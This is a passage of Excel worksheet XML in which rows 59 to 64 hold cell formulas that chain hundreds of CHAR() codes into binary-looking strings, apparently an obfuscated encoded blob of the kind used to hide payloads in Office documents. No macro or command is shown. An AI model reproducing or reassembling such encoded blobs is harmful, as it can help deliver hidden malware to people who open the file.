        <v>"•*ä-q_x001F_åÔÃ¨‹k_x001F_ZBÿ-Cö_x001A_bÔ,Êì¦#Øp•½§_x000C_û‰_x0004_FÒÊ…Añâa&gt;1_x0010_F#réË³&amp;=_x0018_o«ü_x000F_p˜T,_x0005_Øï_x0001_7«ØÂD_x000F_4†i²&gt;§€,_x001E__x000C_b¿“u_x000F_~ô´Wäú/mFžBTg*.±·*^¢…ëŽçáÛ_x0001_/Çí²#’_x0014_ec÷øÅ_x001B_*ÍÐÃÉýBI= °Áµúêõk+t[ÓF_x0015_+XÅk‘}AyÿôD_x0003_ÇQu6)_x0015_¸î£v$|E¸iµgÀ_x001D_+_x0001_Ë‰í;M½…8áaxhØ_x0005_&lt;êÑ_x0008__x0011_¾áã®d§Q‡g2h_x0002_Þ›Ij‡R–óœƒIP¨ ¬~àÍ"Ô?©t</v>
      </c>
      <c r="C59" t="str">
        <f>CHAR(119)&amp;CHAR(247)&amp;CHAR(149)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(226)&amp;CHAR(8)&amp;CHAR(173)&amp;CHAR(188)&amp;CHAR(179)</f>
        <v>w÷•£0â_x0008_­¼³</v>
      </c>
    </row>
    <row r="60" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B60" t="str">
        <f>CHAR(111)&amp;CHAR(120)&amp;CHAR(82)&amp;CHAR(212)&amp;CHAR(105)&amp;CHAR(32)&amp;CHAR(251)&amp;CHAR(255)&amp;CHAR(112)&amp;CHAR(75)&amp;CHAR(222)&amp;CHAR(125)&amp;CHAR(41)&amp;CHAR(222)&amp;CHAR(252)&amp;CHAR(223)&amp;CHAR(9)&amp;CHAR(238)&amp;CHAR(186)&amp;CHAR(55)&amp;CHAR(13)&amp;CHAR(220)&amp;CHAR(182)&amp;CHAR(216)&amp;CHAR(56)&amp;CHAR(17)&amp;CHAR(202)&amp;CHAR(80)&amp;CHAR(125)&amp;CHAR(72)&amp;CHAR(131)&amp;CHAR(106)&amp;CHAR(164)&amp;CHAR(134)&amp;CHAR(213)&amp;CHAR(61)&amp;CHAR(52)&amp;CHAR(244)&amp;CHAR(65)&amp;CHAR(158)&amp;CHAR(148)&amp;CHAR(100)&amp;CHAR(188)&amp;CHAR(196)&amp;CHAR(135)&amp;CHAR(205)&amp;CHAR(140)&amp;CHAR(220)&amp;CHAR(205)&amp;CHAR(132)&amp;CHAR(50)&amp;CHAR(155)&amp;CHAR(65)&amp;CHAR(24)&amp;CHAR(86)&amp;CHAR(183)&amp;CHAR(138)&amp;CHAR(206)&amp;CHAR(68)&amp;CHAR(100)&amp;CHAR(127)&amp;CHAR(22)&amp;CHAR(187)&amp;CHAR(16)&amp;CHAR(154)&amp;CHAR(77)&amp;CHAR(101)&amp;CHAR(37)&amp;CHAR(187)&amp;CHAR(213)&amp;CHAR(62)&amp;CHAR(120)&amp;CHAR(88)&amp;CHAR(101)&amp;CHAR(59)&amp;CHAR(9)&amp;CHAR(118)&amp;CHAR(86)&amp;CHAR(183)&amp;CHAR(151)&amp;CHAR(8)&amp;CHAR(32)&amp;CHAR(8)&amp;CHAR(216)&amp;CHAR(190)&amp;CHAR(115)&amp;CHAR(114)&amp;CHAR(192)&amp;CHAR(64)&amp;CHAR(254)&amp;CHAR(114)&amp;CHAR(64)&amp;CHAR(98)&amp;CHAR(53)&amp;CHAR(199)&amp;CHAR(124)&amp;CHAR(237)&amp;CHAR(126)&amp;CHAR(45)&amp;CHAR(82)&amp;CHAR(237)&amp;CHAR(5)&amp;CHAR(92)&amp;CHAR(25)&amp;CHAR(236)&amp;CHAR(198)&amp;CHAR(212)&amp;CHAR(166)&amp;CHAR(79)&amp;CHAR(33)&amp;CHAR(9)&amp;CHAR(65)&amp;CHAR(36)&amp;CHAR(194)&amp;CHAR(226)&amp;CHAR(136)&amp;CHAR(252)&amp;CHAR(133)&amp;CHAR(141)&amp;CHAR(154)&amp;CHAR(206)&amp;CHAR(2)&amp;CHAR(226)&amp;CHAR(86)&amp;CHAR(207)&amp;CHAR(136)&amp;CHAR(62)&amp;CHAR(76)&amp;CHAR(98)&amp;CHAR(112)&amp;CHAR(73)&amp;CHAR(14)&amp;CHAR(37)&amp;CHAR(104)&amp;CHAR(102)&amp;CHAR(192)&amp;CHAR(183)&amp;CHAR(103)&amp;CHAR(219)&amp;CHAR(116)&amp;CHAR(230)&amp;CHAR(217)&amp;CHAR(88)&amp;CHAR(244)&amp;CHAR(55)&amp;CHAR(50)&amp;CHAR(189)&amp;CHAR(131)&amp;CHAR(92)&amp;CHAR(244)&amp;CHAR(45)&amp;CHAR(30)&amp;CHAR(242)&amp;CHAR(18)&amp;CHAR(136)&amp;CHAR(178)&amp;CHAR(16)&amp;CHAR(119)&amp;CHAR(45)&amp;CHAR(180)&amp;CHAR(25)&amp;CHAR(254)&amp;CHAR(84)&amp;CHAR(80)&amp;CHAR(140)&amp;CHAR(243)&amp;CHAR(51)&amp;CHAR(19)&amp;CHAR(124)&amp;CHAR(122)&amp;CHAR(158)&amp;CHAR(25)&amp;CHAR(184)&amp;CHAR(7)&amp;CHAR(28)&amp;CHAR(44)&amp;CHAR(44)&amp;CHAR(168)&amp;CHAR(95)&amp;CHAR(247)&amp;CHAR(94)&amp;CHAR(172)&amp;CHAR(208)&amp;CHAR(176)&amp;CHAR(232)&amp;CHAR(199)&amp;CHAR(156)&amp;CHAR(62)&amp;CHAR(123)&amp;CHAR(238)&amp;CHAR(112)&amp;CHAR(7)&amp;CHAR(133)&amp;CHAR(117)&amp;CHAR(16)&amp;CHAR(40)&amp;CHAR(221)&amp;CHAR(190)&amp;CHAR(111)&amp;CHAR(85)&amp;CHAR(135)&amp;CHAR(226)&amp;CHAR(63)&amp;CHAR(148)&amp;CHAR(179)&amp;CHAR(33)&amp;CHAR(68)&amp;CHAR(35)&amp;CHAR(50)&amp;CHAR(216)&amp;CHAR(119)&amp;CHAR(199)&amp;CHAR(52)&amp;CHAR(116)&amp;CHAR(110)&amp;CHAR(224)&amp;CHAR(249)&amp;CHAR(68)&amp;CHAR(45)&amp;CHAR(136)&amp;CHAR(55)&amp;CHAR(112)&amp;CHAR(29)&amp;CHAR(65)&amp;CHAR(1)&amp;CHAR(239)&amp;CHAR(125)&amp;CHAR(128)&amp;CHAR(29)&amp;CHAR(171)&amp;CHAR(220)&amp;CHAR(48)&amp;CHAR(234)&amp;CHAR(61)&amp;CHAR(86)&amp;CHAR(245)&amp;CHAR(55)&amp;CHAR(199)&amp;CHAR(81)&amp;CHAR(12)&amp;CHAR(190)&amp;CHAR(35)&amp;CHAR(196)&amp;CHAR(167)&amp;CHAR(46)&amp;CHAR(51)&amp;CHAR(11)&amp;CHAR(192)&amp;CHAR(165)&amp;CHAR(87)&amp;CHAR(36)&amp;CHAR(156)&amp;CHAR(61)&amp;CHAR(136)&amp;CHAR(14)</f>
        <v>oxRÔi ûÿpKÞ})Þüß	îº7_x000D_Ü¶Ø8_x0011_ÊP}Hƒj¤†Õ=4ôAž”d¼Ä‡ÍŒÜÍ„2›A_x0018_V·ŠÎDd_x0016_»_x0010_šMe%»Õ&gt;xXe;	vV·—_x0008_ _x0008_Ø¾srÀ@þr@b5Ç|í~-Rí_x0005_\_x0019_ìÆÔ¦O!	A$Ââˆü…šÎ_x0002_âVÏˆ&gt;LbpI_x000E_%hfÀ·gÛtæÙXô72½ƒ\ô-_x001E_ò_x0012_ˆ²_x0010_w-´_x0019_þTPŒó3_x0013_|zž_x0019_¸_x0007__x001C_,,¨_÷^¬Ð°èÇœ&gt;{îp_x0007_…u_x0010_(Ý¾oU‡â?”³!D#2ØwÇ4tnàùD-ˆ7p_x001D_A_x0001_ï}€_x001D_«Ü0ê=Võ7ÇQ_x000C_¾#Ä§.3_x000B_À¥W$œ=ˆ_x000E_</v>
      </c>
      <c r="C60" t="str">
        <f>CHAR(13)&amp;CHAR(228)&amp;CHAR(62)&amp;CHAR(7)&amp;CHAR(245)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(133)&amp;CHAR(96)</f>
        <v>_x000D_ä&gt;_x0007_õýôS…`</v>
      </c>
    </row>
    <row r="61" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B61" t="str">
        <f>CHAR(99)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(233)&amp;CHAR(189)&amp;CHAR(92)&amp;CHAR(203)&amp;CHAR(178)&amp;CHAR(126)&amp;CHAR(95)&amp;CHAR(165)&amp;CHAR(48)&amp;CHAR(213)&amp;CHAR(126)&amp;CHAR(195)&amp;CHAR(212)&amp;CHAR(162)&amp;CHAR(254)&amp;CHAR(149)&amp;CHAR(250)&amp;CHAR(229)&amp;CHAR(187)&amp;CHAR(59)&amp;CHAR(188)&amp;CHAR(194)&amp;CHAR(221)&amp;CHAR(72)&amp;CHAR(19)&amp;CHAR(141)&amp;CHAR(45)&amp;CHAR(225)&amp;CHAR(149)&amp;CHAR(99)&amp;CHAR(208)&amp;CHAR(220)&amp;CHAR(1)&amp;CHAR(79)&amp;CHAR(234)&amp;CHAR(98)&amp;CHAR(101)&amp;CHAR(237)&amp;CHAR(123)&amp;CHAR(153)&amp;CHAR(153)&amp;CHAR(166)&amp;CHAR(4)&amp;CHAR(201)&amp;CHAR(206)&amp;CHAR(6)&amp;CHAR(165)&amp;CHAR(61)&amp;CHAR(199)&amp;CHAR(163)&amp;CHAR(13)&amp;CHAR(154)&amp;CHAR(246)&amp;CHAR(122)&amp;CHAR(247)&amp;CHAR(9)&amp;CHAR(52)&amp;CHAR(243)&amp;CHAR(44)&amp;CHAR(129)&amp;CHAR(232)&amp;CHAR(71)&amp;CHAR(169)&amp;CHAR(237)&amp;CHAR(152)&amp;CHAR(255)&amp;CHAR(26)&amp;CHAR(60)&amp;CHAR(75)&amp;CHAR(185)&amp;CHAR(189)&amp;CHAR(232)&amp;CHAR(40)&amp;CHAR(73)&amp;CHAR(2)&amp;CHAR(41)&amp;CHAR(240)&amp;CHAR(93)&amp;CHAR(137)&amp;CHAR(47)&amp;CHAR(193)&amp;CHAR(14)&amp;CHAR(254)&amp;CHAR(136)&amp;CHAR(243)&amp;CHAR(171)&amp;CHAR(34)&amp;CHAR(102)&amp;CHAR(50)&amp;CHAR(253)&amp;CHAR(141)&amp;CHAR(156)&amp;CHAR(186)&amp;CHAR(84)&amp;CHAR(229)&amp;CHAR(216)&amp;CHAR(15)&amp;CHAR(139)&amp;CHAR(31)&amp;CHAR(177)&amp;CHAR(149)&amp;CHAR(218)&amp;CHAR(6)&amp;CHAR(48)&amp;CHAR(58)&amp;CHAR(86)&amp;CHAR(159)&amp;CHAR(255)&amp;CHAR(225)&amp;CHAR(217)&amp;CHAR(233)&amp;CHAR(130)&amp;CHAR(216)&amp;CHAR(128)&amp;CHAR(231)&amp;CHAR(245)&amp;CHAR(228)&amp;CHAR(135)&amp;CHAR(93)&amp;CHAR(133)&amp;CHAR(194)&amp;CHAR(205)&amp;CHAR(104)&amp;CHAR(227)&amp;CHAR(33)&amp;CHAR(204)&amp;CHAR(39)&amp;CHAR(203)&amp;CHAR(247)&amp;CHAR(231)&amp;CHAR(213)&amp;CHAR(214)&amp;CHAR(104)&amp;CHAR(209)&amp;CHAR(250)&amp;CHAR(247)&amp;CHAR(205)&amp;CHAR(198)&amp;CHAR(75)&amp;CHAR(93)&amp;CHAR(195)&amp;CHAR(152)&amp;CHAR(235)&amp;CHAR(12)&amp;CHAR(237)&amp;CHAR(143)&amp;CHAR(45)&amp;CHAR(235)&amp;CHAR(22)&amp;CHAR(61)&amp;CHAR(43)&amp;CHAR(59)&amp;CHAR(94)&amp;CHAR(14)&amp;CHAR(127)&amp;CHAR(1)&amp;CHAR(69)&amp;CHAR(135)&amp;CHAR(77)&amp;CHAR(36)&amp;CHAR(133)&amp;CHAR(180)&amp;CHAR(182)&amp;CHAR(222)&amp;CHAR(174)&amp;CHAR(135)&amp;CHAR(87)&amp;CHAR(93)&amp;CHAR(38)&amp;CHAR(135)&amp;CHAR(247)&amp;CHAR(86)&amp;CHAR(158)&amp;CHAR(182)&amp;CHAR(177)&amp;CHAR(179)&amp;CHAR(48)&amp;CHAR(247)&amp;CHAR(122)&amp;CHAR(140)&amp;CHAR(185)&amp;CHAR(145)&amp;CHAR(229)&amp;CHAR(69)&amp;CHAR(108)&amp;CHAR(198)&amp;CHAR(73)&amp;CHAR(85)&amp;CHAR(165)&amp;CHAR(211)&amp;CHAR(139)&amp;CHAR(73)&amp;CHAR(196)&amp;CHAR(180)&amp;CHAR(59)&amp;CHAR(111)&amp;CHAR(40)&amp;CHAR(56)&amp;CHAR(172)&amp;CHAR(37)&amp;CHAR(32)&amp;CHAR(200)&amp;CHAR(210)&amp;CHAR(152)&amp;CHAR(230)&amp;CHAR(252)&amp;CHAR(113)&amp;CHAR(113)&amp;CHAR(68)&amp;CHAR(208)&amp;CHAR(129)&amp;CHAR(3)&amp;CHAR(154)&amp;CHAR(254)&amp;CHAR(150)&amp;CHAR(195)&amp;CHAR(198)&amp;CHAR(24)&amp;CHAR(218)&amp;CHAR(189)&amp;CHAR(1)&amp;CHAR(54)&amp;CHAR(55)&amp;CHAR(199)&amp;CHAR(35)&amp;CHAR(221)&amp;CHAR(35)&amp;CHAR(184)&amp;CHAR(167)&amp;CHAR(1)&amp;CHAR(40)&amp;CHAR(147)&amp;CHAR(21)&amp;CHAR(137)&amp;CHAR(177)&amp;CHAR(83)&amp;CHAR(83)&amp;CHAR(217)&amp;CHAR(184)&amp;CHAR(44)&amp;CHAR(98)&amp;CHAR(95)&amp;CHAR(72)&amp;CHAR(22)&amp;CHAR(145)&amp;CHAR(113)&amp;CHAR(41)&amp;CHAR(124)&amp;CHAR(100)&amp;CHAR(120)&amp;CHAR(218)&amp;CHAR(11)</f>
        <v>c_x000F_
é½\Ë²~_¥0Õ~ÃÔ¢þ•úå»;¼ÂÝH_x0013_-á•cÐÜ_x0001_Oêbeí{™™¦_x0004_ÉÎ_x0006_¥=Ç£_x000D_šöz÷	4ó,èG©í˜ÿ_x001A_&lt;K¹½è(I_x0002_)ð]‰/Á_x000E_þˆó«"f2ýœºTåØ_x000F_‹_x001F_±•Ú_x0006_0:VŸÿáÙé‚Ø€çõä‡]…ÂÍhã!Ì'Ë÷çÕÖhÑú÷ÍÆK]Ã˜ë_x000C_í-ë_x0016_=+;^_x000E__x0001_E‡M$…´¶Þ®‡W]&amp;‡÷Vž¶±³0÷zŒ¹‘åElÆIU¥Ó‹IÄ´;o(8¬% ÈÒ˜æüqqDÐ_x0003_šþ–ÃÆ_x0018_Ú½_x0001_67Ç#Ý#¸§_x0001_(“_x0015_‰±SSÙ¸,b_H_x0016_‘q)|dxÚ_x000B_</v>
      </c>
      <c r="C61" t="str">
        <f>CHAR(191)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(104)&amp;CHAR(123)&amp;CHAR(131)</f>
        <v>¿Îßýô6…h{ƒ</v>
      </c>
    </row>
    <row r="62" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B62" t="str">
        <f>CHAR(29)&amp;CHAR(37)&amp;CHAR(95)&amp;CHAR(108)&amp;CHAR(31)&amp;CHAR(47)&amp;CHAR(157)&amp;CHAR(226)&amp;CHAR(149)&amp;CHAR(14)&amp;CHAR(225)&amp;CHAR(48)&amp;CHAR(53)&amp;CHAR(49)&amp;CHAR(134)&amp;CHAR(63)&amp;CHAR(187)&amp;CHAR(146)&amp;CHAR(102)&amp;CHAR(19)&amp;CHAR(25)&amp;CHAR(161)&amp;CHAR(33)&amp;CHAR(81)&amp;CHAR(210)&amp;CHAR(128)&amp;CHAR(102)&amp;CHAR(233)&amp;CHAR(232)&amp;CHAR(138)&amp;CHAR(147)&amp;CHAR(51)&amp;CHAR(101)&amp;CHAR(139)&amp;CHAR(144)&amp;CHAR(171)&amp;CHAR(239)&amp;CHAR(64)&amp;CHAR(134)&amp;CHAR(55)&amp;CHAR(207)&amp;CHAR(27)&amp;CHAR(204)&amp;CHAR(101)&amp;CHAR(33)&amp;CHAR(4)&amp;CHAR(25)&amp;CHAR(72)&amp;CHAR(98)&amp;CHAR(105)&amp;CHAR(133)&amp;CHAR(158)&amp;CHAR(1)&amp;CHAR(201)&amp;CHAR(235)&amp;CHAR(3)&amp;CHAR(56)&amp;CHAR(203)&amp;CHAR(106)&amp;CHAR(129)&amp;CHAR(54)&amp;CHAR(222)&amp;CHAR(207)&amp;CHAR(79)&amp;CHAR(236)&amp;CHAR(149)&amp;CHAR(224)&amp;CHAR(57)&amp;CHAR(154)&amp;CHAR(45)&amp;CHAR(92)&amp;CHAR(91)&amp;CHAR(17)&amp;CHAR(46)&amp;CHAR(168)&amp;CHAR(125)&amp;CHAR(42)&amp;CHAR(175)&amp;CHAR(83)&amp;CHAR(118)&amp;CHAR(242)&amp;CHAR(56)&amp;CHAR(52)&amp;CHAR(255)&amp;CHAR(70)&amp;CHAR(58)&amp;CHAR(29)&amp;CHAR(109)&amp;CHAR(22)&amp;CHAR(248)&amp;CHAR(196)&amp;CHAR(106)&amp;CHAR(143)&amp;CHAR(118)&amp;CHAR(197)&amp;CHAR(116)&amp;CHAR(93)&amp;CHAR(62)&amp;CHAR(182)&amp;CHAR(249)&amp;CHAR(11)&amp;CHAR(111)&amp;CHAR(160)&amp;CHAR(246)&amp;CHAR(69)&amp;CHAR(186)&amp;CHAR(150)&amp;CHAR(34)&amp;CHAR(23)&amp;CHAR(108)&amp;CHAR(185)&amp;CHAR(55)&amp;CHAR(65)&amp;CHAR(172)&amp;CHAR(57)&amp;CHAR(174)&amp;CHAR(27)&amp;CHAR(19)&amp;CHAR(23)&amp;CHAR(81)&amp;CHAR(134)&amp;CHAR(141)&amp;CHAR(171)&amp;CHAR(171)&amp;CHAR(219)&amp;CHAR(25)&amp;CHAR(117)&amp;CHAR(36)&amp;CHAR(37)&amp;CHAR(146)&amp;CHAR(202)&amp;CHAR(131)&amp;CHAR(87)&amp;CHAR(54)&amp;CHAR(22)&amp;CHAR(215)&amp;CHAR(188)&amp;CHAR(192)&amp;CHAR(197)&amp;CHAR(166)&amp;CHAR(175)&amp;CHAR(134)&amp;CHAR(140)&amp;CHAR(68)&amp;CHAR(31)&amp;CHAR(63)&amp;CHAR(162)&amp;CHAR(214)&amp;CHAR(47)&amp;CHAR(194)&amp;CHAR(61)&amp;CHAR(6)&amp;CHAR(226)&amp;CHAR(229)&amp;CHAR(223)&amp;CHAR(192)&amp;CHAR(29)&amp;CHAR(2)&amp;CHAR(242)&amp;CHAR(243)&amp;CHAR(192)&amp;CHAR(174)&amp;CHAR(122)&amp;CHAR(96)&amp;CHAR(241)&amp;CHAR(111)&amp;CHAR(102)&amp;CHAR(84)&amp;CHAR(165)&amp;CHAR(210)&amp;CHAR(143)&amp;CHAR(31)&amp;CHAR(221)&amp;CHAR(158)&amp;CHAR(115)&amp;CHAR(81)&amp;CHAR(125)&amp;CHAR(158)&amp;CHAR(176)&amp;CHAR(123)&amp;CHAR(62)&amp;CHAR(253)&amp;CHAR(57)&amp;CHAR(9)&amp;CHAR(200)&amp;CHAR(18)&amp;CHAR(148)&amp;CHAR(64)&amp;CHAR(144)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(180)&amp;CHAR(224)&amp;CHAR(163)&amp;CHAR(196)&amp;CHAR(17)&amp;CHAR(111)&amp;CHAR(58)&amp;CHAR(152)&amp;CHAR(119)&amp;CHAR(197)&amp;CHAR(112)&amp;CHAR(124)&amp;CHAR(39)&amp;CHAR(186)&amp;CHAR(66)&amp;CHAR(53)&amp;CHAR(187)&amp;CHAR(186)&amp;CHAR(47)&amp;CHAR(115)&amp;CHAR(179)&amp;CHAR(33)&amp;CHAR(18)&amp;CHAR(217)&amp;CHAR(251)&amp;CHAR(218)&amp;CHAR(197)&amp;CHAR(219)&amp;CHAR(115)&amp;CHAR(151)&amp;CHAR(160)&amp;CHAR(41)&amp;CHAR(204)&amp;CHAR(196)&amp;CHAR(234)&amp;CHAR(107)&amp;CHAR(156)&amp;CHAR(5)&amp;CHAR(81)&amp;CHAR(48)&amp;CHAR(147)&amp;CHAR(150)&amp;CHAR(154)&amp;CHAR(180)&amp;CHAR(72)&amp;CHAR(65)&amp;CHAR(120)&amp;CHAR(49)&amp;CHAR(246)&amp;CHAR(51)&amp;CHAR(133)&amp;CHAR(202)&amp;CHAR(8)&amp;CHAR(135)&amp;CHAR(254)&amp;CHAR(116)&amp;CHAR(84)&amp;CHAR(77)&amp;CHAR(129)&amp;CHAR(56)&amp;CHAR(121)&amp;CHAR(205)&amp;CHAR(163)&amp;CHAR(93)</f>
        <v>_x001D_%_l_x001F_/â•_x000E_á051†?»’f_x0013__x0019_¡!QÒ€féèŠ“3e‹«ï@†7Ï_x001B_Ìe!_x0004__x0019_Hbi…ž_x0001_Éë_x0003_8Ëj6ÞÏOì•à9š-\[_x0011_.¨}*¯Svò84ÿF:_x001D_m_x0016_øÄjvÅt]&gt;¶ù_x000B_o öEº–"_x0017_l¹7A¬9®_x001B__x0013__x0017_Q†««Û_x0019_u$%’ÊƒW6_x0016_×¼ÀÅ¦¯†ŒD_x001F_?¢Ö/Â=_x0006_âåßÀ_x001D__x0002_òóÀ®z`ñofT¥Ò_x001F_ÝžsQ}ž°{&gt;ý9	È_x0012_”@_x0006_Ë´à£Ä_x0011_o:˜wÅp|'ºB5»º/s³!_x0012_ÙûÚÅÛs— )ÌÄêkœ_x0005_Q0“–š´HAx1ö3…Ê_x0008_‡þtTM8yÍ£]</v>
      </c>
      <c r="C62" t="str">
        <f>CHAR(191)&amp;CHAR(118)&amp;CHAR(244)&amp;CHAR(126)&amp;CHAR(70)&amp;CHAR(235)&amp;CHAR(222)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(241)</f>
        <v>¿vô~FëÞ£|ñ</v>
      </c>
    </row>
    <row r="63" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B63" t="str">
        <f>CHAR(196)&amp;CHAR(92)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(224)&amp;CHAR(251)&amp;CHAR(111)&amp;CHAR(201)&amp;CHAR(169)&amp;CHAR(158)&amp;CHAR(67)&amp;CHAR(159)&amp;CHAR(71)&amp;CHAR(75)&amp;CHAR(69)&amp;CHAR(35)&amp;CHAR(249)&amp;CHAR(126)&amp;CHAR(215)&amp;CHAR(164)&amp;CHAR(57)&amp;CHAR(51)&amp;CHAR(148)&amp;CHAR(170)&amp;CHAR(11)&amp;CHAR(151)&amp;CHAR(146)&amp;CHAR(115)&amp;CHAR(183)&amp;CHAR(189)&amp;CHAR(212)&amp;CHAR(39)&amp;CHAR(16)&amp;CHAR(238)&amp;CHAR(252)&amp;CHAR(225)&amp;CHAR(25)&amp;CHAR(132)&amp;CHAR(198)&amp;CHAR(74)&amp;CHAR(62)&amp;CHAR(78)&amp;CHAR(86)&amp;CHAR(7)&amp;CHAR(144)&amp;CHAR(154)&amp;CHAR(81)&amp;CHAR(193)&amp;CHAR(65)&amp;CHAR(123)&amp;CHAR(163)&amp;CHAR(177)&amp;CHAR(86)&amp;CHAR(58)&amp;CHAR(230)&amp;CHAR(33)&amp;CHAR(252)&amp;CHAR(159)&amp;CHAR(126)&amp;CHAR(97)&amp;CHAR(29)&amp;CHAR(141)&amp;CHAR(50)&amp;CHAR(70)&amp;CHAR(241)&amp;CHAR(80)&amp;CHAR(113)&amp;CHAR(38)&amp;CHAR(9)&amp;CHAR(105)&amp;CHAR(72)&amp;CHAR(183)&amp;CHAR(172)&amp;CHAR(167)&amp;CHAR(146)&amp;CHAR(46)&amp;CHAR(239)&amp;CHAR(80)&amp;CHAR(66)&amp;CHAR(105)&amp;CHAR(130)&amp;CHAR(191)&amp;CHAR(39)&amp;CHAR(59)&amp;CHAR(190)&amp;CHAR(125)&amp;CHAR(143)&amp;CHAR(138)&amp;CHAR(254)&amp;CHAR(236)&amp;CHAR(223)&amp;CHAR(171)&amp;CHAR(228)&amp;CHAR(160)&amp;CHAR(15)&amp;CHAR(169)&amp;CHAR(148)&amp;CHAR(250)&amp;CHAR(203)&amp;CHAR(46)&amp;CHAR(111)&amp;CHAR(159)&amp;CHAR(75)&amp;CHAR(39)&amp;CHAR(78)&amp;CHAR(157)&amp;CHAR(121)&amp;CHAR(234)&amp;CHAR(200)&amp;CHAR(100)&amp;CHAR(114)&amp;CHAR(95)&amp;CHAR(151)&amp;CHAR(64)&amp;CHAR(55)&amp;CHAR(174)&amp;CHAR(84)&amp;CHAR(22)&amp;CHAR(11)&amp;CHAR(110)&amp;CHAR(138)&amp;CHAR(19)&amp;CHAR(216)&amp;CHAR(113)&amp;CHAR(113)&amp;CHAR(121)&amp;CHAR(10)&amp;CHAR(185)&amp;CHAR(206)&amp;CHAR(236)&amp;CHAR(246)&amp;CHAR(33)&amp;CHAR(186)&amp;CHAR(40)&amp;CHAR(154)&amp;CHAR(26)&amp;CHAR(236)&amp;CHAR(147)&amp;CHAR(196)&amp;CHAR(139)&amp;CHAR(208)&amp;CHAR(11)&amp;CHAR(73)&amp;CHAR(186)&amp;CHAR(77)&amp;CHAR(203)&amp;CHAR(236)&amp;CHAR(201)&amp;CHAR(212)&amp;CHAR(33)&amp;CHAR(13)&amp;CHAR(170)&amp;CHAR(133)&amp;CHAR(114)&amp;CHAR(16)&amp;CHAR(22)&amp;CHAR(5)&amp;CHAR(150)&amp;CHAR(138)&amp;CHAR(175)&amp;CHAR(98)&amp;CHAR(85)&amp;CHAR(96)&amp;CHAR(47)&amp;CHAR(208)&amp;CHAR(24)&amp;CHAR(25)&amp;CHAR(137)&amp;CHAR(114)&amp;CHAR(214)&amp;CHAR(137)&amp;CHAR(110)&amp;CHAR(185)&amp;CHAR(130)&amp;CHAR(218)&amp;CHAR(139)&amp;CHAR(205)&amp;CHAR(26)&amp;CHAR(203)&amp;CHAR(237)&amp;CHAR(120)&amp;CHAR(137)&amp;CHAR(249)&amp;CHAR(54)&amp;CHAR(220)&amp;CHAR(100)&amp;CHAR(26)&amp;CHAR(134)&amp;CHAR(123)&amp;CHAR(20)&amp;CHAR(113)&amp;CHAR(200)&amp;CHAR(91)&amp;CHAR(220)&amp;CHAR(226)&amp;CHAR(25)&amp;CHAR(150)&amp;CHAR(182)&amp;CHAR(42)&amp;CHAR(204)&amp;CHAR(227)&amp;CHAR(53)&amp;CHAR(150)&amp;CHAR(186)&amp;CHAR(23)&amp;CHAR(217)&amp;CHAR(216)&amp;CHAR(120)&amp;CHAR(160)&amp;CHAR(100)&amp;CHAR(129)&amp;CHAR(166)&amp;CHAR(115)&amp;CHAR(91)&amp;CHAR(12)&amp;CHAR(184)&amp;CHAR(27)&amp;CHAR(108)&amp;CHAR(213)&amp;CHAR(198)&amp;CHAR(100)&amp;CHAR(108)&amp;CHAR(142)&amp;CHAR(93)&amp;CHAR(55)&amp;CHAR(38)&amp;CHAR(146)&amp;CHAR(201)&amp;CHAR(39)&amp;CHAR(14)&amp;CHAR(130)&amp;CHAR(239)&amp;CHAR(14)&amp;CHAR(27)&amp;CHAR(33)&amp;CHAR(132)&amp;CHAR(139)&amp;CHAR(232)&amp;CHAR(215)&amp;CHAR(197)&amp;CHAR(178)&amp;CHAR(236)&amp;CHAR(108)&amp;CHAR(255)&amp;CHAR(201)&amp;CHAR(67)&amp;CHAR(98)&amp;CHAR(126)&amp;CHAR(85)&amp;CHAR(215)&amp;CHAR(210)&amp;CHAR(77)&amp;CHAR(230)&amp;CHAR(175)&amp;CHAR(142)</f>
        <v>Ä\RRàûoÉ©žCŸGKE#ù~×¤93”ª_x000B_—’s·½Ô'_x0010_îüá_x0019_„ÆJ&gt;NV_x0007_šQÁA{£±V:æ!üŸ~a_x001D_2FñPq&amp;	iH·¬§’.ïPBi‚¿';¾}Šþìß«ä _x000F_©”úË.oŸK'NyêÈdr_—@7®T_x0016__x000B_nŠ_x0013_Øqqy
¹Îìö!º(š_x001A_ì“Ä‹Ð_x000B_IºMËìÉÔ!_x000D_ª…r_x0010__x0016__x0005_–Š¯bU`/Ð_x0018__x0019_‰rÖ‰n¹‚Ú‹Í_x001A_Ëíx‰ù6Üd_x001A_†{_x0014_qÈ[Üâ_x0019_–¶*Ìã5–º_x0017_ÙØx d¦s[_x000C_¸_x001B_lÕÆdlŽ]7&amp;’É'_x000E_‚ï_x000E__x001B_!„‹è×Å²ìlÿÉCb~U×ÒMæ¯Ž</v>
      </c>
      <c r="C63" t="str">
        <f>CHAR(209)&amp;CHAR(30)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(163)&amp;CHAR(116)&amp;CHAR(60)&amp;CHAR(156)&amp;CHAR(126)</f>
        <v>Ñ_x001E_Íë»£t&lt;œ~</v>
      </c>
    </row>
    <row r="64" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B64" t="str">
